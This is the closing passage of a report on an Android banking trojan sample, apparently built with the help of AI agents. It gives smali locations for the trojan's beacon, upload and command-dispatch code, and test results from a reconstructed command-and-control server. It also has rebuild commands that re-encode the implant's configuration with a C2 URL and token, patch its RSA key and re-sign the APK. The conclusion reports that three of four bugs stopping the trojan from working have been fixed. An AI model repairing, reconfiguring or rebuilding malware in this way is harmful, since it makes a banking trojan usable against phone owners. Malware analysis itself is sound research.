- Line ~100: `:pswitch_1` — Key loading entry point
- Line ~110-130: Asset-based key reading (after fix)

#### sp0.smali (Network Operations)
- Line 1664: `sp0.e()` — Beacon and command polling
- Line 2021: `:cond_6` — Plain form fallback
- Line 2786: `sp0.f()` — Raw file upload
- Line 2790: Empty `sp0->c` check (bails if no endpoint)
- Line clinit: Endpoint name XOR decoding

#### MyFirebaseMessagingService$Companion.smali (Command Dispatch)
- Line 41: `processCommandDirect` entry
- Line 211: `:cond_0` — SDK version check
- Line 211-240: Service start attempt (broken)
- Line `:goto_1` — In-process fallback (correct)

#### et.smali (FirebaseMessagingService base)
- Line 401: `onStartCommand` — Intent discarding
- Line 269: `handleIntentOnMainThread` — Returns 0 (no start)

#### h0.smali (Service Starter)
- Line 195-204: `n()` — `Context.startForegroundService()`

---

### Appendix C: Test Results

```
$ python3 test_protocol.py
[ok]   server encrypt/decrypt round-trip
[ok]   envelope has v,d,k,i
[ok]   client-style envelope decrypts
[ok]   tampered payload rejected
[ok]   public key is valid X.509 SPKI (294B)
[ok]   classify: encrypted envelope
[ok]   encrypted payload decoded
[ok]   unencoded envelope tolerated
[ok]   classify: plain form
[ok]   plain form keeps device id
[ok]   classify: raw file
[ok]   raw file body preserved verbatim
[ok]   empty envelope raises ProtocolError
[ok]   plain beacon accepted
[ok]   command queued
[ok]   command delivered on next beacon
[ok]   raw file upload stored
[ok]   command marked completed by upload
[ok]   completed command links its artifact
[ok]   artifact listed
[ok]   artifact downloadable
[ok]   bad token rejected
[ok]   dashboard renders
[ok]   health reports stats
[ok]   migration preserves the device row
[ok]   migration carries files -> artifacts
[ok]   migration is idempotent

ALL CHECKS PASSED
```

---

### Appendix D: Rebuilding Commands

```bash
# Full rebuild with all fixes (except command dispatch)
/home/arsham/bin/apktool d -f -o /tmp/build/dec D_Kyt7_lab.apk
python3 -I analysis/harden_native.py   /tmp/build/dec
python3 -I analysis/reencode_config.py /tmp/build/dec \
    "VexR_Lab_Academic_Token_2026" \
    "https://vexr-lab-c2-academic-production.up.railway.app"
python3 -I analysis/fix_pubkey2.py     /tmp/build/dec
/home/arsham/bin/apktool b /tmp/build/dec -o /tmp/build/out.apk
java -jar /home/arsham/bin/uber-apk-signer.jar --apks /tmp/build/out.apk \
    --ks lab_keystore.jks --ksAlias labkey \
    --ksPass labpass123 --ksKeyPass labpass123 --allowResign --overwrite
```

---

### Appendix E: Glossary

| Term | Definition |
|------|------------|
| APK | Android Package Kit — Android application file format |
| DEX | Dalvik Executable — Compiled Android bytecode |
| smali | Human-readable representation of DEX bytecode |
| C2 | Command and Control — Server that controls malware |
| FCM | Firebase Cloud Messaging — Push notification service |
| AES-CBC | Advanced Encryption Standard in Cipher Block Chaining mode |
| RSA | Rivest-Shamir-Adleman — Public-key cryptosystem |
| PKCS | Public Key Cryptography Standards |
| XOR | Exclusive OR — Reversible bitwise operation used for obfuscation |
| WAL | Write-Ahead Logging — SQLite mode for concurrent access |

---

## Conclusion

The VexR banking trojan sample analyzed contains **four critical bugs** that prevent it from functioning correctly on modern Android versions:

1. **Token mismatch** between implant and C2 server
2. **RSA key corruption** due to apktool null byte handling
3. **Command execution blocked** by Android 12+ foreground service restrictions
4. **Raw file transport misdirected** to decryption handler

Fixes #1, #2, and #4 have been **implemented and verified** in the reconstructed C2 server. Fix #3 (command dispatch) has been **analyzed and documented** but not applied.

### Academic Value

This analysis demonstrates:
- **Static analysis techniques** for Android malware
- **Protocol reverse engineering** from DEX bytecode
- **Root cause analysis** of observed failures
- **Adversarial verification** using multi-agent workflows
- **Secure C2 reconstruction** for academic study

The findings provide valuable insights into malware behavior on modern Android versions and the importance of thorough testing by malware authors.

---

**End of Document**
